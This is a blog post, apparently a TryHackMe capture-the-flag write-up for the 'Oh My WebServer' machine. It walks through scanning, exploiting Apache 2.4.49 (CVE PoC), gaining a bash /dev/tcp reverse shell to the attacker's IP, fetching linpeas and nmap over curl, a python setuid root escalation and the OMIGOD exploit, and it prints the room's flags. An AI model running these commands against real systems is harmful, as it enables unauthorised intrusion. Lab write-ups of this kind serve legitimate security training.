@@ -1,0 +1,334 @@
+<!DOCTYPE html><html class="appearance-dark" lang="en"><head><meta charset="UTF-8"><title>Oh My WebServer</title><meta name="description" content="scientia potentia est."><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
+<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/hexo-theme-Claudia/images/favicon.jpg"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="Target IP Address: 10.10.242.41
+Information GatheringNMAP ScanningNmap scans network ports to determine their status (open, closed, or filtered), identifies services running on them, and detects their versions.
+
+command used: (scanning for all ports fast and efficient)
+
+└─$ sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.242.41
+
+→ output:
+Host .."><meta name="generator" content="Hexo 7.1.1"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Rãzvan's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Oh My WebServer</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Information-Gathering"><span class="toc-text">Information Gathering</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#NMAP-Scanning"><span class="toc-text">NMAP Scanning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NMAP-Full-Scanning"><span class="toc-text">NMAP Full Scanning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Services"><span class="toc-text">Services</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP-22-Default-Port-for-ssh"><span class="toc-text">TCP 22 (Default Port for ssh)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP-80-Default-Port-for-HTTP"><span class="toc-text">TCP 80 (Default Port for HTTP)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Directory-Busting-with-GoBuster"><span class="toc-text">Directory Busting with GoBuster</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulnerability-Assessment"><span class="toc-text">Vulnerability Assessment</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Searching-for-exploits-Apache-httpd-2-4-49"><span class="toc-text">Searching for exploits (Apache httpd 2.4.49)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gaining-Initial-Access"><span class="toc-text">Gaining Initial Access</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Post-Exploitation"><span class="toc-text">Post-Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploring-the-System"><span class="toc-text">Exploring the System</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-text">Privilege Escalation</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/TryHackMe"><i class="tag post-item-tag">TryHackMe</i></a><a href="/tags/CTF"><i class="tag post-item-tag">CTF</i></a><a href="/tags/Medium"><i class="tag post-item-tag">Medium</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">Oh My WebServer</h1><time class="has-text-grey" datetime="2024-07-31T05:49:31.000Z">2024-07-31</time><article class="mt-2 post-content"><p>Target IP Address: 10.10.242.41</p>
+<h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><h2 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning"></a>NMAP Scanning</h2><p>Nmap scans network ports to determine their status (open, closed, or filtered), identifies services running on them, and detects their versions.</p>
+<ul>
+<li>command used: (scanning for all ports fast and efficient)</li>
+</ul>
+<pre><code class="hljs bash">└─$ sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.242.41</code></pre>
+
+<p>→ output:</p>
+<pre><code class="hljs bash">Host is up, received user-set (0.082s latency).
+Scanned at 2024-05-27 11:32:19 EDT <span class="hljs-keyword">for</span> 26s
+Not shown: 65533 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 62
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 26.65 seconds
+           Raw packets sent: 131088 (5.768MB) | Rcvd: 22 (968B)</code></pre>
+
+<h2 id="NMAP-Full-Scanning"><a href="#NMAP-Full-Scanning" class="headerlink" title="NMAP Full Scanning"></a>NMAP Full Scanning</h2><ul>
+<li>command used: ( scanning the ports we got )</li>
+</ul>
+<pre><code class="hljs bash">└─$ nmap -A -sC -sV -p22,80 10.10.242.41 -Pn</code></pre>
+
+<p>→ output:</p>
+<pre><code class="hljs bash">Host is up (0.074s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 e0:d1:88:76:2a:93:79:d3:91:04:6d:25:16:0e:56:d4 (RSA)
+|   256 91:18:5c:2c:5e:f8:99:3c:9a:1f:04:24:30:0e:aa:9b (ECDSA)
+|_  256 d1:63:2a:36:<span class="hljs-built_in">dd</span>:94:cf:3c:57:3e:8a:e8:85:00:ca:f6 (ED25519)
+80/tcp open  http    Apache httpd 2.4.49 ((Unix))
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Consult - Business Consultancy Agency Template | Home
+|_http-server-header: Apache/2.4.49 (Unix)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+<h2 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h2><h3 id="TCP-22-Default-Port-for-ssh"><a href="#TCP-22-Default-Port-for-ssh" class="headerlink" title="TCP 22 (Default Port for ssh)"></a>TCP 22 (Default Port for ssh)</h3><p>-&gt; SSH package version - Might be able to find the OS and version.</p>
+<p>-&gt; SSH key fingerprint - Has the key been re-used somewhere (Another machine? Same machine, just another port&#x2F;service?)</p>
+<p>-&gt; SSH banner - Any text (if at all) before the password prompt (often get legal warnings about connecting to it)</p>
+<p>-&gt; SSH package version:</p>
+<pre><code class="hljs bash">nc -vn 10.10.242.41 22</code></pre>
+
+<p>→ output:</p>
+<pre><code class="hljs bash">└─$ nc -vn 10.10.242.41 22
+(UNKNOWN) [10.10.242.41] 22 (ssh) open
+SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3</code></pre>
+
+<p>-&gt; SSH key fingerprint:</p>
+<pre><code class="hljs bash">ssh root@10.10.242.41</code></pre>
+
+<p>→ output:</p>
+<pre><code class="hljs bash">└─$ ssh root@10.10.242.41
+The authenticity of host <span class="hljs-string">&#x27;10.10.242.41 (10.10.242.41)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span>
+<span class="hljs-string">ED25519 key fingerprint is SHA256:9ru28sBHRllPgsckS0CPU0Er77YnxIOdkbJDLhcVoaQ.</span>
+<span class="hljs-string">This key is not known by any other names.</span>
+<span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])?</span></code></pre>
+
+<h3 id="TCP-80-Default-Port-for-HTTP"><a href="#TCP-80-Default-Port-for-HTTP" class="headerlink" title="TCP 80 (Default Port for HTTP)"></a>TCP 80 (Default Port for HTTP)</h3><p>→ WebServer:</p>
+<pre><code class="hljs bash">curl -i http://10.10.242.41 | <span class="hljs-built_in">head</span> -n 50</code></pre>
+
+<p>→ output:</p>
+<pre><code class="hljs bash">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0HTTP/1.1 200 OK
+Date: Mon, 27 May 2024 15:37:18 GMT
+Server: Apache/2.4.49 (Unix)
+Last-Modified: Wed, 23 Feb 2022 05:40:45 GMT
+ETag: <span class="hljs-string">&quot;e281-5d8a8e82e3140&quot;</span>
+Accept-Ranges: bytes
+Content-Length: 57985
+Content-Type: text/html
+
+&lt;!doctype html&gt;
+&lt;html class=<span class="hljs-string">&quot;no-js&quot;</span> lang=<span class="hljs-string">&quot;en&quot;</span>&gt;
+
+&lt;<span class="hljs-built_in">head</span>&gt;
+    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;
+    
+    &lt;!--====== Title ======--&gt;
+    &lt;title&gt;Consult - Business Consultancy Agency Template | Home&lt;/title&gt;
+    
+    &lt;meta name=<span class="hljs-string">&quot;description&quot;</span> content=<span class="hljs-string">&quot;&quot;</span>&gt;
+    &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;
+
+    &lt;!--====== Favicon Icon ======--&gt;
+    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;shortcut icon&quot;</span> href=<span class="hljs-string">&quot;assets/images/favicon.png&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;image/png&quot;</span>&gt;
+        
+    &lt;!--====== Slick CSS ======--&gt;
+    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;assets/css/slick.css&quot;</span>&gt;
+        
+    &lt;!--====== Font Awesome CSS ======--&gt;
+    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;assets/css/font-awesome.min.css&quot;</span>&gt;
+        
+    &lt;!--====== Line Icons CSS ======--&gt;
+    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;assets/css/LineIcons.css&quot;</span>&gt;
+        
+    &lt;!--====== Animate CSS ======--&gt;
+    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;assets/css/animate.css&quot;</span>&gt;
+        
+    &lt;!--====== Magnific Popup CSS ======--&gt;
+    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;assets/css/magnific-popup.css&quot;</span>&gt;
+        
+    &lt;!--====== Bootstrap CSS ======--&gt;
+    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;assets/css/bootstrap.min.css&quot;</span>&gt;
+    
+    &lt;!--====== Default CSS ======--&gt;
+    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;assets/css/default.css&quot;</span>&gt;
+    
+    &lt;!--====== Style CSS ======--&gt;
+    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;assets/css/style.css&quot;</span>&gt;
+    
+&lt;/head&gt;</code></pre>
+
+<h2 id="Directory-Busting-with-GoBuster"><a href="#Directory-Busting-with-GoBuster" class="headerlink" title="Directory Busting with GoBuster"></a>Directory Busting with GoBuster</h2><p><strong>Directory busting with Gobuster involves using the tool to brute-force and enumerate hidden directories and files on a web server.</strong></p>
+<ul>
+<li>command:</li>
+</ul>
+<pre><code class="hljs bash">└─$ gobuster <span class="hljs-built_in">dir</span> -u http://10.10.242.41/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></pre>
+
+<p>→ output:</p>
+<pre><code class="hljs bash">Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.242.41/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode
+===============================================================
+/assets               (Status: 301) [Size: 235] [--&gt; http://10.10.242.41/assets/]
+</code></pre>
+
+<p>Found &#x2F;<strong>assets</strong></p>
+<p><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/6f68d33f-6ab8-44bc-9167-d03c4dbdb250/e674e0d7-5e41-4aea-9a5e-a9ec5df34797/Untitled.png" alt="Untitled"></p>
+<h1 id="Vulnerability-Assessment"><a href="#Vulnerability-Assessment" class="headerlink" title="Vulnerability Assessment"></a>Vulnerability Assessment</h1><h2 id="Searching-for-exploits-Apache-httpd-2-4-49"><a href="#Searching-for-exploits-Apache-httpd-2-4-49" class="headerlink" title="Searching for exploits (Apache httpd 2.4.49)"></a>Searching for exploits (Apache httpd 2.4.49)</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/50383">https://www.exploit-db.com/exploits/50383</a></li>
+</ul>
+<p>Create a file <code>target.txt</code> with the IP → Copy the exploit and name the file <a target="_blank" rel="noopener" href="http://poc.sh/"><code>poc.sh</code></a> → run it using the following command:</p>
+<pre><code class="hljs bash">bash poc.sh targets.txt /bin/sh <span class="hljs-built_in">whoami</span></code></pre>
+
+<p>→ output:</p>
+<pre><code class="hljs bash">10.10.136.172
+daemon</code></pre>
+
+<h2 id="Gaining-Initial-Access"><a href="#Gaining-Initial-Access" class="headerlink" title="Gaining Initial Access"></a>Gaining Initial Access</h2><p>Now what we have is an example of a command execution.</p>
+<p>→ Get a shell on the system</p>
+<ul>
+<li>command:</li>
+</ul>
+<pre><code class="hljs bash">bash -c <span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/machine ip/6666 0&gt;&amp;1&#x27;</span></code></pre>
+
+<p>But first before we run this start a netcat listener on port 6666:</p>
+<pre><code class="hljs bash">nc -lvnp 6666</code></pre>
+
+<ul>
+<li>Full command:</li>
+</ul>
+<pre><code class="hljs bash">└─$ bash poc.sh targets.txt /bin/sh <span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.9.3.177/6666 0&gt;&amp;1&#x27;&quot;</span></code></pre>
+
+<p>→ Netcat listener output: (we got shell)</p>
+<pre><code class="hljs bash">└─$ nc -lvnp 6666
+listening on [any] 6666 ...
+connect to [10.9.3.177] from (UNKNOWN) [10.10.136.172] 32810
+bash: cannot <span class="hljs-built_in">set</span> terminal process group (1): Inappropriate ioctl <span class="hljs-keyword">for</span> device
+bash: no job control <span class="hljs-keyword">in</span> this shell
+daemon@4a70924bafa0:/bin$</code></pre>
+
+<h1 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post-Exploitation"></a>Post-Exploitation</h1><h2 id="Exploring-the-System"><a href="#Exploring-the-System" class="headerlink" title="Exploring the System"></a>Exploring the System</h2><p>Go to <code>/</code> </p>
+<p>→</p>
+<pre><code class="hljs bash">daemon@4a70924bafa0:/bin$ <span class="hljs-built_in">cd</span> /
+<span class="hljs-built_in">cd</span> /
+daemon@4a70924bafa0:/$ <span class="hljs-built_in">ls</span>
+<span class="hljs-built_in">ls</span>
+bin
+boot
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+daemon@4a70924bafa0:/$ <span class="hljs-built_in">ls</span> -la
+<span class="hljs-built_in">ls</span> -la
+total 76
+drwxr-xr-x   1 root root 4096 Feb 23  2022 .
+drwxr-xr-x   1 root root 4096 Feb 23  2022 ..
+-rwxr-xr-x   1 root root    0 Feb 23  2022 .dockerenv
+drwxr-xr-x   1 root root 4096 Oct  8  2021 bin
+drwxr-xr-x   2 root root 4096 Jun 13  2021 boot
+drwxr-xr-x   5 root root  340 May 28 17:55 dev
+drwxr-xr-x   1 root root 4096 Feb 23  2022 etc
+drwxr-xr-x   2 root root 4096 Jun 13  2021 home
+drwxr-xr-x   1 root root 4096 Oct  8  2021 lib
+drwxr-xr-x   2 root root 4096 Sep 27  2021 lib64
+drwxr-xr-x   2 root root 4096 Sep 27  2021 media
+drwxr-xr-x   2 root root 4096 Sep 27  2021 mnt
+drwxr-xr-x   2 root root 4096 Sep 27  2021 opt
+dr-xr-xr-x 167 root root    0 May 28 17:55 proc
+drwx------   1 root root 4096 Oct  8  2021 root
+drwxr-xr-x   3 root root 4096 Sep 27  2021 run
+drwxr-xr-x   1 root root 4096 Oct  8  2021 sbin
+drwxr-xr-x   2 root root 4096 Sep 27  2021 srv
+dr-xr-xr-x  13 root root    0 May 28 17:55 sys
+drwxrwxrwt   1 root root 4096 Feb 23  2022 tmp
+drwxr-xr-x   1 root root 4096 Sep 27  2021 usr
+drwxr-xr-x   1 root root 4096 Sep 27  2021 var</code></pre>
+
+<p>Something interesting .. a docker.. </p>
+<p>So that basically means we’re inside a docker container.</p>
+<p><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/6f68d33f-6ab8-44bc-9167-d03c4dbdb250/329dcd2c-3f6e-4f1b-b80a-7e6d41060e0f/Screenshot_2024-05-28_at_21.20.19.png" alt="Screenshot 2024-05-28 at 21.20.19.png"></p>
+<p><strong>A Docker is a tool designed to make it easier to create, deploy, and run applications by using containers. Containers allow a developer to package up an application with all parts it needs, such as libraries and other dependencies, and ship it all out as one package. By doing so, thanks to the container, the developer can rest assured that the application will run on any other Linux machine regardless of any customized settings that machine might have that could differ from the machine used for writing and testing the code.</strong></p>
+<p><strong>LinPEAS</strong> is a script used in penetration testing to automate the process of enumerating possible paths to escalate privileges on a Linux system.</p>
+<p>Uploading <strong>LinPEAS</strong></p>
+<ul>
+<li>Start a python3 http.server:</li>
+</ul>
+<pre><code class="hljs bash">└─$ python3 -m http.server</code></pre>
+
+<ul>
+<li>In our shell → Go to &#x2F;tmp and we run this command to download linpeas:</li>
+</ul>
+<pre><code class="hljs bash">daemon@4a70924bafa0:/tmp$ curl -O http://10.9.3.177:8000/linpeas.sh
+curl -O http://10.9.2.5:8000/nmap</code></pre>
+
+<p>→ chmod +x</p>
+<pre><code class="hljs bash">daemon@4a70924bafa0:/tmp$ <span class="hljs-built_in">chmod</span> +x linpeas.sh</code></pre>
+
+<p>Now run linpeas with <code>./linpeas.sh</code></p>
+<p><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/6f68d33f-6ab8-44bc-9167-d03c4dbdb250/3100e61a-2d6f-472b-8e3c-be92b733573d/Screenshot_2024-05-28_at_21.41.41.png" alt="Screenshot 2024-05-28 at 21.41.41.png"></p>
+<p>Found something:</p>
+<p><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/6f68d33f-6ab8-44bc-9167-d03c4dbdb250/44fc5482-0d21-41fa-bc1b-c50c68dc3941/Untitled.png" alt="Untitled"></p>
+<p>→ After searching on GTFOBins we found a oneliner command that will get us root privileges</p>
+<ul>
+<li>commands used:</li>
+</ul>
+<pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#x27;</span></code></pre>
+
+<pre><code class="hljs bash"><span class="hljs-built_in">whoami</span>
+root</code></pre>
+
+<p>Spawning a &#x2F;bin&#x2F;bash shell</p>
+<ul>
+<li>command:</li>
+</ul>
+<pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</span></code></pre>
+
+<p>→ Get Flag:</p>
+<pre><code class="hljs bash">root@4a70924bafa0:/root<span class="hljs-comment"># cat user.txt</span>
+<span class="hljs-built_in">cat</span> user.txt
+</code></pre>
+
+<p>User Flag: <code>THM&#123;eacffefe1d2aafcc15e70dc2f07f7ac1&#125;</code></p>
+<h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>Now we need to upload nmap:</p>
+<p>→ Go to &#x2F;usr&#x2F;bin because there we find nmap → Start a http server and run this command in the docker:</p>
+<pre><code class="hljs bash">curl -O http://10.9.2.5:8000/nmap</code></pre>
+
+<p><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/6f68d33f-6ab8-44bc-9167-d03c4dbdb250/62a5906c-7a08-43e4-9c9b-1de8cd2ae545/Untitled.png" alt="Untitled"></p>
+<p>→ ifconfig:</p>
+<p><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/6f68d33f-6ab8-44bc-9167-d03c4dbdb250/0720d1e1-8dec-4788-a687-7e71f4a75948/Untitled.png" alt="Untitled"></p>
+<p>→ Scan the network with nmap:</p>
+<pre><code class="hljs bash">root@4a70924bafa0:/tmp<span class="hljs-comment"># ./nmap 172.17.0.0/24</span>
+./nmap 172.17.0.0/24
+
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-07-19 19:38 UTC
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report <span class="hljs-keyword">for</span> ip-172-17-0-1.eu-west-1.compute.internal (172.17.0.1)
+Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
+Host is up (-0.021s latency).
+Not shown: 1205 filtered ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 02:42:93:DF:25:AC (Unknown)
+
+Nmap scan report <span class="hljs-keyword">for</span> 4a70924bafa0 (172.17.0.2)
+Host is up (0.0000080s latency).
+Not shown: 1206 closed ports
+PORT   STATE SERVICE
+80/tcp open  http</code></pre>
+
+<p>Now we will scan the 172.17.0.1 IP address to see what services are running and we will find port 5986, After some research we found out that port 5986 is used by WinRM, or Windows Remote Management we also found this article after we searched for a <code>port 5986 CVE</code> :</p>
+<p><a target="_blank" rel="noopener" href="https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure">https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure</a></p>
+<ul>
+<li><strong>OMI is an Azure agent intended to facilitate remote management of linux VM’s hosted in Microsoft Azure</strong></li>
+</ul>
+<p>We downloaded the script to our machine and transfer it to the root shell</p>
+<pre><code class="hljs python">root@4a70924bafa0:/tmp<span class="hljs-comment"># curl -O http://10.9.2.5:80/omi.py</span></code></pre>
+
+<p>→ Run the script: </p>
+<pre><code class="hljs python">root@4a70924bafa0:/tmp<span class="hljs-comment"># python3 omi.py -t 172.17.0.1 -p 5986 -c &#x27;id&#x27;</span>
+python3 omi.py -t <span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> -p <span class="hljs-number">5986</span> -c <span class="hljs-string">&#x27;id&#x27;</span>
+uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)</code></pre>
+
+<p>Now we can simply read the root flag:</p>
+<pre><code class="hljs python">python3 omi.py -t <span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> -p <span class="hljs-number">5986</span> -c <span class="hljs-string">&#x27;cd ../../../../ &amp;&amp; cat /root/root.txt</span></code></pre>
+
+<p>→ output:</p>
+<pre><code class="hljs python">root@4a70924bafa0:/tmp<span class="hljs-comment"># python3 omi.py -t 172.17.0.1 -p 5986 -c &#x27;cd ../../../../ &amp;&amp; cat /root/root.txt&#x27;</span>
+&lt; -p <span class="hljs-number">5986</span> -c <span class="hljs-string">&#x27;cd ../../../../ &amp;&amp; cat /root/root.txt&#x27;</span>
+THM&#123;7f147ef1f36da9ae29529890a1b6011f&#125;
+</code></pre>
+
+<p>Root Flag: <code>THM&#123;7f147ef1f36da9ae29529890a1b6011f&#125;</code></p>
+</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2024/07/31/GreenHorn/" title="GreenHorn"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: GreenHorn</span></a><a class="button is-default" href="/2024/07/26/PermX/" title="PermX"><span class="has-text-weight-semibold">Next: PermX</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><a title="linkedin" target="_blank" rel="noopener nofollow" href="//www.linkedin.com/in/razvan-popa-333740293"><i class="iconfont icon-linkedin"></i></a><!-- 脸书--></section><p><span>Copyright ©</span><span> Rãzvan 2024</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
